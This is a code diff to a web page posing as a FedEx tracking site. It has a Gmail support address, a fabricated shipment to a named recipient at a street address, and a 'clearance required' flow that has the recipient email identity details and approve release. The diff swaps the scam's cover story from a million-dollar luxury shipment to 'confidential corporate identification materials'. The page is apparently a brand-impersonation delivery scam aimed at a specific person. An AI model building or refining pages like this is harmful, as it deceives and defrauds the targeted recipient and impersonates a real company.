@@ -512,7 +512,7 @@
         <div class="flex space-x-2 sm:space-x-4">
           <span>English</span>
           <span class="status-indicator"></span>
-          <span class="hidden sm:inline">Live System</span>
+          <span class="hidden sm:inline">Real-time updates</span>
         </div>
         <div class="flex space-x-2 sm:space-x-4">
           <a href="mailto:helpfedexparcel@gmail.com" class="hover:text-fedex-orange" onclick="showPage('support')">Support</a>
@@ -624,7 +624,7 @@
                   <i class="fas fa-shield-alt text-white text-lg sm:text-2xl"></i>
                 </div>
                 <h3 class="text-sm sm:text-lg font-bold text-fedex-dark-gray mb-1 sm:mb-2">Secure Handling</h3>
-                <p class="text-fedex-gray text-xs sm:text-sm">Advanced security for high-value shipments</p>
+                <p class="text-fedex-gray text-xs sm:text-sm">Advanced security for confidential shipments</p>
               </div>
 
               <div class="feature-card bg-white rounded-lg p-4 sm:p-6 text-center">
@@ -1073,10 +1073,10 @@
                     <p class="text-fedex-gray text-sm">Phone: <a href="tel:(901) 818-7500">(901) 818-7500</a></p>
                   </div>
                   <div class="p-4 border border-gray-200 rounded-lg">
-                    <h4 class="font-bold text-fedex-dark-gray">International Hub - Paris</h4>
-                    <p class="text-fedex-gray text-sm">15 Rue de la Paix</p>
-                    <p class="text-fedex-gray text-sm">75001 Paris, France</p>
-                    <p class="text-fedex-gray text-sm">Phone: <a href="tel:+33 1 42 61 50 50">+33 1 42 61 50 50</a></p>
+                    <h4 class="font-bold text-fedex-dark-gray">Operations Hub - Phoenix</h4>
+                    <p class="text-fedex-gray text-sm">2701 S. 15th Ave</p>
+                    <p class="text-fedex-gray text-sm">Phoenix, AZ 85007</p>
+                    <p class="text-fedex-gray text-sm">Phone: <a href="tel:+1 602-452-3900">+1 602-452-3900</a></p>
                   </div>
                 </div>
               </div>
@@ -1349,25 +1349,25 @@
     const mockData = {
       packages: [
         {
-          tracking_number: '7946 3210 5843',
+          tracking_number: '794632105843',
           status: 'in_transit',
           service_type: 'Priority Same-Day Air',
           current_location: 'In Transit (Airborne)',
           estimated_delivery: 'Today by 8:00 PM',
-          ship_date: '2025-10-06',
-          weight: '4500',
-          dimensions: '96" x 120" x 72"',
-          declared_value: 1000000.00,
-          contents: 'Peter Millar original cloth & copy of membership cards & VIP tag',
-          reference_number: 'HIGH-VALUE-SHIPMENT-DT',
-          insurance_coverage: 1000000.00,
+          ship_date: '2026-01-07',
+          weight: '4.5',
+          dimensions: '12" x 9" x 3"',
+          declared_value: 850.00,
+          contents: 'Identification materials and printed documents, including identification card, card holder, lanyard, instruction materials, reference card, and welcome documentation',
+          reference_number: 'CORP-ID-MATERIALS-DT',
+          insurance_coverage: 1000.00,
           progress_percentage: 65,
           requires_clearance: false,
-          sender_name: 'Erwin Stoff',
-          sender_company: 'FedEx Office Paris',
-          sender_address: '15 Rue de la Paix',
-          sender_city: '75001 Paris, France',
-          sender_phone: '+33 1 42 61 50 50',
+          sender_name: 'Corporate Services',
+          sender_company: 'Lions Gate Corporation',
+          sender_address: '2701 S. 15th Ave',
+          sender_city: 'Phoenix, AZ 85007',
+          sender_phone: '',
           recipient_name: 'Denise Trumbauer',
           recipient_address: '653 N Annapolis Ave',
           recipient_city: 'Atlantic City, NJ 08401',
@@ -1381,30 +1381,30 @@
       tracking_events: 
   [
   {
-    tracking_number: '7946 3210 5843',
+    tracking_number: '794632105843',
     status: 'registered',
     location: 'PHOENIX, AZ - Origin Facility',
-    event_date: '2025-10-05',
+    event_date: '2026-01-07',
     event_time: '08:15:00',
     description: 'Package registered at origin facility in Phoenix, AZ. Preparing for air transport.',
     is_latest: false,
     event_type: 'status_update'
   },
   {
-    tracking_number: '7946 3210 5843',
+    tracking_number: '794632105843',
     status: 'awaiting_clearance',
     location: 'MEMPHIS, TN - Air Operations Hub',
-    event_date: '2025-10-06',
+    event_date: '2026-01-08',
     event_time: '14:45:00',
     description: 'Package cleared through processing at Memphis Air Operations Hub and forwarded to the aircraft.',
     is_latest: false,
     event_type: 'clearance'
   },
   {
-    tracking_number: '7946 3210 5843',
+    tracking_number: '794632105843',
     status: 'in_transit',
     location: 'En Route - Airborne',
-    event_date: '2025-10-07',
+    event_date: '2026-01-08',
     event_time: '11:30:00',
     description: 'Package is airborne and en route to destination hub. Cleared and forwarded for delivery.',
     is_latest: true,
@@ -1457,7 +1457,7 @@
         },
         {
           question: 'What is a clearance request for international packages?',
-          answer: 'High-value international shipments require recipient verification and approval before they can proceed through customs to their destination.',
+          answer: 'Confidential shipments may require recipient verification and approval before they can proceed through processing to their destination.',
           category: 'clearance',
           display_order: 2
         },
@@ -1528,7 +1528,7 @@
         await new Promise(resolve => setTimeout(resolve, 1000));
 
         const packageData = mockData.packages.find(pkg => 
-          pkg.tracking_number.toUpperCase() === trackingNumber.toUpperCase()
+          pkg.tracking_number.replace(/\s/g, '') === trackingNumber.replace(/\s/g, '')
         );
 
         if (!packageData) {
@@ -1536,7 +1536,7 @@
         }
 
         const events = mockData.tracking_events.filter(event => 
-          event.tracking_number.toUpperCase() === trackingNumber.toUpperCase()
+          event.tracking_number.replace(/\s/g, '') === trackingNumber.replace(/\s/g, '')
         );
 
         const fullPackageData = { ...packageData, timeline: events };
@@ -1624,7 +1624,7 @@
               <div>
                 <h4 class="font-bold text-yellow-800 mb-1 sm:mb-2 text-sm sm:text-base">Clearance Required</h4>
                 <p class="text-yellow-700 text-xs sm:text-sm">
-                  Your ultra high-value package is registered at ${data.current_location} and requires clearance approval from the recipient before we can proceed with international shipping to ${data.recipient_city}.
+                  Your corporate materials shipment requires clearance approval from the recipient before we can proceed with shipping to ${data.recipient_city}.
                 </p>
               </div>
             </div>
@@ -1695,7 +1695,7 @@
                 </div>
                 <div class="flex justify-between">
                   <span class="text-fedex-gray">Contents:</span>
-                  <span class="font-semibold">${data.contents}</span>
+                  <span class="font-semibold">Identification materials and printed documents</span>
                 </div>
                 <div class="flex justify-between">
                   <span class="text-fedex-gray">Reference:</span>
@@ -1714,7 +1714,6 @@
                   <p class="text-fedex-gray">${data.sender_company}</p>
                   <p class="text-fedex-gray">${data.sender_address}</p>
                   <p class="text-fedex-gray">${data.sender_city}</p>
-                  <p class="text-fedex-gray">Phone: ${data.sender_phone}</p>
                 </div>
                 <div>
                   <h4 class="font-semibold text-fedex-gray mb-1 sm:mb-2">To:</h4>
@@ -1756,16 +1755,15 @@
           </div>
         </div>
 
-        ${data.declared_value >= 1000000 ? `
-        <!-- Ultra High-Value Notice -->
-        <div class="mt-4 sm:mt-8 bg-red-50 border border-red-200 rounded-lg p-3 sm:p-6">
+        ${data.declared_value >= 5000 ? `
+        <!-- Confidential Shipment Notice -->
+        <div class="mt-4 sm:mt-8 bg-blue-50 border border-blue-200 rounded-lg p-3 sm:p-6">
           <div class="flex items-start space-x-2 sm:space-x-3">
-            <i class="fas fa-shield-alt text-red-600 text-lg sm:text-xl mt-1"></i>
+            <i class="fas fa-file-contract text-blue-600 text-lg sm:text-xl mt-1"></i>
             <div>
-              <h4 class="font-semibold text-red-800 mb-1 sm:mb-2 text-sm sm:text-base">Ultra High-Value Shipment</h4>
-              <p class="text-red-700 text-xs sm:text-sm">
-                This shipment contains ultra high-value items ($${data.declared_value.toLocaleString()} USD) including luxury vehicles and precious items. Special security protocols are in effect. 
-                ${data.requires_clearance ? 'Clearance approval and comprehensive identity verification are mandatory before international shipping can proceed.' : ''}
+              <h4 class="font-semibold text-blue-800 mb-1 sm:mb-2 text-sm sm:text-base">Confidential Corporate Materials</h4>
+              <p class="text-blue-700 text-xs sm:text-sm">
+                This shipment contains confidential corporate identification materials and documents requiring secure handling and tracking.
               </p>
             </div>
           </div>
@@ -1788,7 +1786,7 @@
       const subject = `Clearance Request for Package ${trackingNumber}`;
       const body = `Dear FedEx Team,
 
-I am requesting clearance for my high-value package with tracking number: ${trackingNumber}
+I am requesting clearance for my corporate materials package with tracking number: ${trackingNumber}
 
 Package Details:
 - Tracking Number: ${trackingNumber}
@@ -1802,7 +1800,7 @@ Recipient Information:
 - Phone: ${packageData.recipient_phone}
 - Email: ${packageData.recipient_email}
 
-I confirm that I am the intended recipient of this package and authorize FedEx to proceed with the clearance process and international shipping.
+I confirm that I am the intended recipient of this package and authorize FedEx to proceed with the clearance process and shipping.
 
 Please let me know if you need any additional documentation or verification.
 
@@ -1953,7 +1951,7 @@ ${packageData.recipient_name}`;
         yPos += 10;
         doc.text(`Declared Value: $${packageData.declared_value.toLocaleString()} USD`, 20, yPos);
         yPos += 10;
-        doc.text(`Contents: ${packageData.contents}`, 20, yPos);
+        doc.text(`Contents: Identification materials and printed documents`, 20, yPos);
 
         yPos += 20;
         doc.setFontSize(14);
@@ -1964,6 +1962,8 @@ ${packageData.recipient_name}`;
         doc.text('From:', 20, yPos);
         yPos += 10;
         doc.text(`${packageData.sender_name}`, 25, yPos);
+        yPos += 8;
+        doc.text(`${packageData.sender_company}`, 25, yPos);
         yPos += 8;
         doc.text(`${packageData.sender_address}`, 25, yPos);
         yPos += 8;
